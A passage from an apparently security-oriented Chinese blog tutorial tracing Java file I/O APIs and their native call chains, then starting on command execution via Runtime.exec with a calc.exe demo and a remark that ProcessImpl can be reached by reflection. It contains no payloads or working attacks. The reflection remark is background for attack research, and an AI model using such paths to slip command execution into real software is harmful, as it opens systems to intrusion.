<li>并不是所有的文件操作都在<code>java.io.FileSystem</code>中定义,文件的读取最终调用的是<code>java.io.FileInputStream#read0、readBytes</code>、<code>java.io.RandomAccessFile#read0、readBytes</code>,而写文件调用的是<code>java.io.FileOutputStream#writeBytes</code>、<code>java.io.RandomAccessFile#write0</code>。</li>
<li>Java有两类文件系统API！一个是基于<code>阻塞模式的IO</code>的文件系统，另一是JDK7+基于<code>NIO.2</code>的文件系统。</li>
</ol>
<h3 id="Java-NIO-2-文件系统"><a href="#Java-NIO-2-文件系统" class="headerlink" title="Java NIO.2 文件系统"></a>Java NIO.2 文件系统</h3><p>Java 7提出了一个基于NIO的文件系统，这个NIO文件系统和阻塞IO文件系统两者是完全独立的。<code>java.nio.file.spi.FileSystemProvider</code>对文件的封装和<code>java.io.FileSystem</code>同理。</p>
<img src="/image/image-20191203181206243.png" alt="img" style="zoom:80%;" />

<h3 id="Java-IO流"><a href="#Java-IO流" class="headerlink" title="Java IO流"></a>Java IO流</h3><h4 id="IO"><a href="#IO" class="headerlink" title="IO"></a>IO</h4><p>计算机系统的IO即通过数据流、序列化和文件系统提供系统输入和输出。</p>
<h4 id="流"><a href="#流" class="headerlink" title="流"></a>流</h4><p>流是一个很形象的概念，当程序需要读取数据的时候，就会开启一个通向<strong>数据源</strong>的流，这个数据源可以是文件，内存，或者是网络连接。类似的，当程序需要写入数据的时候，就会开启一个通向目的地的流。这时候你就可以想象数据好像在这其中“流”动一样。</p>
<p>Java把这些不同来源和目标的数据都统一抽象为数据流。</p>
<h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>按流向分：<br>1）输入流：程序可以从中读取数据的流；<br>2）输出流：程序能向其中写入数据的流</p>
<p>按数据传输单位分：<br>1）字节流：以字节为单位传输数据的流；<br>2）字符流：以字符为单位传输数据的流；</p>
<p>按功能分：<br>1）节点流：用于直接操作目标设备的流；<br>2）过滤流：是对一个已存在的流的链接和封装，通过对数据进行处理为程序提供功能强大、灵活的读写功能。</p>
<h3 id="Java-IO-NIO多种读写文件方式"><a href="#Java-IO-NIO多种读写文件方式" class="headerlink" title="Java IO&#x2F;NIO多种读写文件方式"></a>Java IO&#x2F;NIO多种读写文件方式</h3><p>上一章节我们提到了Java 对文件的读写分为了基于阻塞模式的IO和非阻塞模式的NIO，本章节我将列举一些我们常用于读写文件的方式。</p>
<p>我们通常读写文件都是使用的阻塞模式，与之对应的也就是<code>java.io.FileSystem</code>。<code>java.io.FileInputStream</code>类提供了对文件的读取功能，Java的其他读取文件的方法基本上都是封装了<code>java.io.FileInputStream</code>类，比如：<code>java.io.FileReader</code>。</p>
<h4 id="FileInputStream文件读取"><a href="#FileInputStream文件读取" class="headerlink" title="FileInputStream文件读取"></a>FileInputStream文件读取</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.filesystem;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestFileInputStream</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//创建文件对象</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;C:\\Windows\\System32\\drivers\\etc\\hosts&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//打开文件对象，创建文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//定义每次输入流读取的字节数对象</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建字节缓冲区对象，定义缓冲区大小</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建字节输出流对象</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//循环读取文件内容</span></span><br><span class="line">        <span class="comment">//read方法将文件输入流中的内容读取（剪切）到bytes内存中，bytes缓冲区有多大就读多长，读完了就返回-1</span></span><br><span class="line">        <span class="keyword">while</span> ((a = fis.read(bytes)) != -<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="comment">//write方法截取bytes缓冲区数组中的内容到baos字节输出流对象中</span></span><br><span class="line">            <span class="comment">//(bytes, 0, a)其中的0表示从bytes数组的下标0开始截取，a表示输入流read到的字节数</span></span><br><span class="line">            baos.write(bytes, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(baos);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230708200357651.png" alt="image-20230708200357651" style="zoom:80%;" />

<p>首先来看一下read方法</p>
<img src="/image/image-20230708200318187.png" alt="image-20230708200318187" style="zoom:80%;" />

<p>可以看到read方法会自动计算缓冲区的长度，并且调用readBytes，这是一个native方法，将此输入流中最多b.length长度的字节读取到缓冲区中（剪切而不是复制），如果没有数据了读就会返回-1</p>
<p>接着一下write方法</p>
<img src="/image/image-20230708212522112.png" alt="image-20230708212522112" style="zoom:80%;" />

<p>从偏移0处截取len长度的数据，并写入到输出流中</p>
<p>调用链如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.io.FileInputStream.readBytes(FileInputStream.java:<span class="number">219</span>)</span><br><span class="line">java.io.FileInputStream.read(FileInputStream.java:<span class="number">233</span>)</span><br><span class="line">com.y5neko.sec.filesystem.FileInputStreamDemo.main(FileInputStreamDemo.java:<span class="number">27</span>)</span><br></pre></td></tr></table></figure>

<p>其中的readBytes是native方法，文件的打开、关闭等方法也都是native方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">readBytes</span><span class="params">(<span class="type">byte</span> b[], <span class="type">int</span> off, <span class="type">int</span> len)</span> <span class="keyword">throws</span> IOException;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">open0</span><span class="params">(String name)</span> <span class="keyword">throws</span> FileNotFoundException;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">read0</span><span class="params">()</span> <span class="keyword">throws</span> IOException;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> <span class="type">long</span> <span class="title function_">skip0</span><span class="params">(<span class="type">long</span> n)</span> <span class="keyword">throws</span> IOException;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">available0</span><span class="params">()</span> <span class="keyword">throws</span> IOException;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">close0</span><span class="params">()</span> <span class="keyword">throws</span> IOException;</span><br></pre></td></tr></table></figure>

<p><code>java.io.FileInputStream</code>类对应的native由C语言实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">JNIEXPORT <span class="type">void</span> JNICALL</span><br><span class="line"><span class="title function_">Java_java_io_FileInputStream_open0</span><span class="params">(JNIEnv *env, jobject this, jstring path)</span> &#123;</span><br><span class="line">    fileOpen(env, this, path, fis_fd, O_RDONLY);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">JNIEXPORT jint JNICALL</span><br><span class="line"><span class="title function_">Java_java_io_FileInputStream_read0</span><span class="params">(JNIEnv *env, jobject this)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> readSingle(env, this, fis_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">JNIEXPORT jint JNICALL</span><br><span class="line"><span class="title function_">Java_java_io_FileInputStream_readBytes</span><span class="params">(JNIEnv *env, jobject this,</span></span><br><span class="line"><span class="params">        jbyteArray bytes, jint off, jint len)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> readBytes(env, this, bytes, off, len, fis_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">JNIEXPORT jlong JNICALL</span><br><span class="line"><span class="title function_">Java_java_io_FileInputStream_skip0</span><span class="params">(JNIEnv *env, jobject this, jlong toSkip)</span> &#123;</span><br><span class="line">    jlong cur = jlong_zero;</span><br><span class="line">    jlong end = jlong_zero;</span><br><span class="line">    FD fd = GET_FD(this, fis_fd);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        JNU_ThrowIOException (env, <span class="string">&quot;Stream Closed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((cur = IO_Lseek(fd, (jlong)<span class="number">0</span>, (jint)SEEK_CUR)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        JNU_ThrowIOExceptionWithLastError(env, <span class="string">&quot;Seek error&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((end = IO_Lseek(fd, toSkip, (jint)SEEK_CUR)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        JNU_ThrowIOExceptionWithLastError(env, <span class="string">&quot;Seek error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (end - cur);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">JNIEXPORT jint JNICALL</span><br><span class="line"><span class="title function_">Java_java_io_FileInputStream_available0</span><span class="params">(JNIEnv *env, jobject this)</span> &#123;</span><br><span class="line">    jlong ret;</span><br><span class="line">    FD fd = GET_FD(this, fis_fd);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        JNU_ThrowIOException (env, <span class="string">&quot;Stream Closed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (IO_Available(fd, &amp;ret)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ret &gt; INT_MAX) &#123;</span><br><span class="line">            ret = (jlong) INT_MAX;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            ret = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> jlong_to_jint(ret);</span><br><span class="line">    &#125;</span><br><span class="line">    JNU_ThrowIOExceptionWithLastError(env, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="FileOutputStream文件写入"><a href="#FileOutputStream文件写入" class="headerlink" title="FileOutputStream文件写入"></a>FileOutputStream文件写入</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.filesystem;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestFileOutputStream</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:/test.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="string">&quot;Hello Y5neKO!&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过getBytes方法获得字节数组，向文件输出流中写入</span></span><br><span class="line">        fos.write(content.getBytes());</span><br><span class="line">        <span class="comment">//flush方法是为了清空缓冲区</span></span><br><span class="line">        fos.flush();</span><br><span class="line">        fos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230709145014002.png" alt="image-20230709145014002" style="zoom:80%;" />

<p>flush方法是字节输出流的抽象父类OutputStream的方法，所以每个字节输出流类都会有flush方法。但是有些没有缓冲区的类flush方法只是被重写了，但什么都不做，也就是方法体是为空的。所以FileOutputStream调用flush方法什么都没做。另外，close方法也会强制清空缓冲区，因此不写flush也是可以的，但对于不能马上调用close方法的，还是需要用flush方法强制清空一下。毕竟一旦调用close方法，这个流对象也就不能用了。</p>
<img src="/image/image-20230709142911121.png" alt="image-20230709142911121" style="zoom:80%;" />

<h4 id="RandomAccessFile"><a href="#RandomAccessFile" class="headerlink" title="RandomAccessFile"></a>RandomAccessFile</h4><p>Java提供了一个非常有趣的读取文件内容的类: <code>java.io.RandomAccessFile</code>,这个类名字面意思是任意文件内容访问，特别之处是这个类不仅可以像<code>java.io.FileInputStream</code>一样读取文件，而且还可以写文件。</p>
<h5 id="RandomAccessFile读取文件"><a href="#RandomAccessFile读取文件" class="headerlink" title="RandomAccessFile读取文件"></a>RandomAccessFile读取文件</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.filesystem;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.RandomAccessFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestRandomAccessFileInput</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:/test.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建RandomAccessFile对象,r表示以只读模式打开文件，一共有:r(只读)、rw(读写)、</span></span><br><span class="line">            <span class="comment">// rws(读写内容同步)、rwd(读写内容或元数据同步)四种模式。</span></span><br><span class="line">            <span class="type">RandomAccessFile</span> <span class="variable">raf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(file, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 定义每次输入流读取到的字节数对象</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 定义缓冲区大小</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建二进制输出流对象</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 循环读取文件内容</span></span><br><span class="line">            <span class="keyword">while</span> ((a = raf.read(bytes)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="comment">// 截取缓冲区数组中的内容，(bytes, 0, a)其中的0表示从bytes数组的</span></span><br><span class="line">                <span class="comment">// 下标0开始截取，a表示输入流read到的字节数。</span></span><br><span class="line">                out.write(bytes, <span class="number">0</span>, a);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            System.out.println(out);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230709145100673.png" alt="image-20230709145100673" style="zoom:80%;" />

<p><code>java.io.RandomAccessFile</code>类中提供了几十个<code>readXXX</code>方法用以读取文件系统，最终都会调用到<code>read0</code>或者<code>readBytes</code>方法，我们只需要掌握如何利用<code>RandomAccessFile</code>读&#x2F;写文件就行了。</p>
<h5 id="RandomAccessFile写文件"><a href="#RandomAccessFile写文件" class="headerlink" title="RandomAccessFile写文件"></a>RandomAccessFile写文件</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.filesystem;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.RandomAccessFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestRandomAccessFileOutput</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:/test.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 定义待写入文件内容</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="string">&quot;Hello Y5neKO!&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建RandomAccessFile对象,rw表示以读写模式打开文件，一共有:r(只读)、rw(读写)、</span></span><br><span class="line">            <span class="comment">// rws(读写内容同步)、rwd(读写内容或元数据同步)四种模式。</span></span><br><span class="line">            <span class="type">RandomAccessFile</span> <span class="variable">raf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(file, <span class="string">&quot;rw&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 写入内容二进制到文件</span></span><br><span class="line">            raf.write(content.getBytes());</span><br><span class="line">            raf.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="FileSystemProvider"><a href="#FileSystemProvider" class="headerlink" title="FileSystemProvider"></a>FileSystemProvider</h4><p>JDK7新增的NIO.2的<code>java.nio.file.spi.FileSystemProvider</code>,利用<code>FileSystemProvider</code>我们可以利用支持异步的通道(<code>Channel</code>)模式读取文件内容。</p>
<h5 id="FileSystemProvider读取文件"><a href="#FileSystemProvider读取文件" class="headerlink" title="FileSystemProvider读取文件"></a>FileSystemProvider读取文件</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.filesystem;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestFileSystemProviderInput</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 定义读取的文件路径</span></span><br><span class="line">        <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;D:/test.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes = Files.readAllBytes(path);</span><br><span class="line">            System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(bytes));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>java.nio.file.Files</code>是JDK7开始提供的一个对文件读写取非常便捷的API，其底层实在是调用了<code>java.nio.file.spi.FileSystemProvider</code>来实现对文件的读写的。最为底层的实现类是<code>sun.nio.ch.FileDispatcherImpl#read0</code>。</p>
<p>基于NIO的文件读取逻辑是：打开FileChannel-&gt;读取Channel内容。</p>
<p>打开FileChannel的调用链为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">sun.nio.ch.FileChannelImpl.&lt;init&gt;(FileChannelImpl.java:<span class="number">89</span>)</span><br><span class="line">sun.nio.ch.FileChannelImpl.open(FileChannelImpl.java:<span class="number">105</span>)</span><br><span class="line">sun.nio.fs.UnixChannelFactory.newFileChannel(UnixChannelFactory.java:<span class="number">137</span>)</span><br><span class="line">sun.nio.fs.UnixChannelFactory.newFileChannel(UnixChannelFactory.java:<span class="number">148</span>)</span><br><span class="line">sun.nio.fs.UnixFileSystemProvider.newByteChannel(UnixFileSystemProvider.java:<span class="number">212</span>)</span><br><span class="line">java.nio.file.Files.newByteChannel(Files.java:<span class="number">361</span>)</span><br><span class="line">java.nio.file.Files.newByteChannel(Files.java:<span class="number">407</span>)</span><br><span class="line">java.nio.file.Files.readAllBytes(Files.java:<span class="number">3152</span>)</span><br><span class="line">com.y5neko.sec.filesystem.FilesDemo.main(FilesDemo.java:<span class="number">23</span>)</span><br></pre></td></tr></table></figure>

<p>文件读取的调用链为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">sun.nio.ch.FileChannelImpl.read(FileChannelImpl.java:<span class="number">147</span>)</span><br><span class="line">sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:<span class="number">65</span>)</span><br><span class="line">sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:<span class="number">109</span>)</span><br><span class="line">sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:<span class="number">103</span>)</span><br><span class="line">java.nio.file.Files.read(Files.java:<span class="number">3105</span>)</span><br><span class="line">java.nio.file.Files.readAllBytes(Files.java:<span class="number">3158</span>)</span><br><span class="line">com.y5neko.sec.filesystem.FilesDemo.main(FilesDemo.java:<span class="number">23</span>)</span><br></pre></td></tr></table></figure>

<h5 id="FileSystemProvider写文件"><a href="#FileSystemProvider写文件" class="headerlink" title="FileSystemProvider写文件"></a>FileSystemProvider写文件</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.filesystem;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestFileSystemProviderOutput</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 定义读取的文件路径</span></span><br><span class="line">        <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;D:/test.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 定义待写入文件内容</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="string">&quot;Hello Y5neKO!&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 写入内容二进制到文件</span></span><br><span class="line">            Files.write(path, content.getBytes());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Java-文件名空字节截断漏洞"><a href="#Java-文件名空字节截断漏洞" class="headerlink" title="Java 文件名空字节截断漏洞"></a>Java 文件名空字节截断漏洞</h3><p>&lt;略&gt;</p>
<h2 id="命令执行流程"><a href="#命令执行流程" class="headerlink" title="命令执行流程"></a>命令执行流程</h2><p>常用的是 <code>java.lang.Runtime#exec()</code>和 <code>java.lang.ProcessBuilder#start()</code>，除此之外，还有更为底层的<code>java.lang.ProcessImpl#start()</code>，他们的调用关系如下图所示：</p>
<img src="/image/640.png" alt="图片" style="zoom: 80%;" />

<p>其中，ProcessImpl类是Process抽象类的具体实现，且该类的构造函数使用private修饰，所以无法在java.lang包外直接调用，只能通过反射调用ProcessImpl#start()方法执行命令。</p>
<img src="/image/640-16668698136972.png" alt="图片" style="zoom:80%;" />

<h3 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h3><p>比较通常用的一种命令执行方法，Runtime.getRuntime中的exec方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Runtime.getRuntime().exec 用于调用外部可执行程序或系统命令，并重定向外部程序的标准输入、标准输出和标准错误到缓冲池。功能和windows“运行”类似</p>
<blockquote>
<p>Runtime.exec不是shell环境，不能直接调用shell命令，需要对不同的操作系统调用不同的命令解释器，Windows的cmd，Linux的&#x2F;bin&#x2F;bash或&#x2F;bin&#x2F;sh等</p>
</blockquote>
<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>Java中，Runtime类提供了许多的API来与<code>java runtime environment</code>进行交互，如：</p>
<ul>
<li>执行一个进程。</li>
<li>调用垃圾回收。</li>
<li>查看总内存和剩余内存。</li>
</ul>
<p>Runtime是单例的，可以通过<code>Runtime.getRuntime()</code>得到这个单例。</p>
<h4 id="API列表"><a href="#API列表" class="headerlink" title="API列表"></a>API列表</h4><p>一些常见的API</p>
<img src="/image/image-20221027172001415.png" alt="image-20221027172001415" style="zoom:80%;" />

<p>这里详细分析exec的调用链</p>
<h4 id="exec调用链"><a href="#exec调用链" class="headerlink" title="exec调用链"></a>exec调用链</h4><p>首先找到接口位置，位于<code>java.lang</code>的<code>Runtime</code>类</p>
<p>首先通过<code>getRuntime</code>方法获取一个Runtime对象</p>
<img src="/image/image-20221027181658266.png" alt="image-20221027181658266" style="zoom:80%;" />

<p><img src="/image/image-20221027181758661.png" alt="image-20221027181758661"></p>
<p>紧接着调用exec方法，可以看到exec一共有六个重载方法</p>
<img src="/image/image-20221027191629449.png" alt="image-20221027191629449" style="zoom:80%;" />

<p>其中完整的参数有三个，command、envp、dir，位置和类型如上，其中command为必须，envp和dir为可选；envp为环境变量，没有envp参数或许为null，那么新发动的进程就承继当时java进程的环境变量；dir为工作目录，没有dir参数或许为null，那么新发动的进程就承继当时java进程的工作目录；我们按顺序来看</p>
<h5 id="java-lang-Runtime-java-347"><a href="#java-lang-Runtime-java-347" class="headerlink" title="java.lang.Runtime.java:347"></a>java.lang.Runtime.java:347</h5><img src="/image/image-20221027192912394.png" alt="image-20221027192912394" style="zoom:80%;" />

<p>第一个重载方法是在只传入一个String类型时执行的方法，此时envp和dir参数为null，官方的注释为：在单独的进程中执行指定的字符串命令。</p>
<h5 id="java-lang-Runtime-java-387"><a href="#java-lang-Runtime-java-387" class="headerlink" title="java.lang.Runtime.java:387"></a>java.lang.Runtime.java:387</h5><img src="/image/image-20221027193726926.png" alt="image-20221027193726926" style="zoom:80%;" />

<p>第二个重载方法只有dir参数为空，官方的注释为：在具有指定环境的单独进程中执行指定的字符串命令。</p>
<h5 id="java-lang-Runtime-java-441"><a href="#java-lang-Runtime-java-441" class="headerlink" title="java.lang.Runtime.java:441"></a>java.lang.Runtime.java:441</h5><img src="/image/image-20221027201257825.png" alt="image-20221027201257825" style="zoom:80%;" />

<p>第三个重载方法三个参数都有，官方的注释为：在具有指定环境和工作目录的单独进程中执行指定的字符串命令。</p>
<p>这个方法用到了<code>StringTokenizer</code>类，作用是根据某些字符做间隔进行分割字符，具体形式后面再具体分析；最后转变为cmdarray数组传入了exec方法</p>
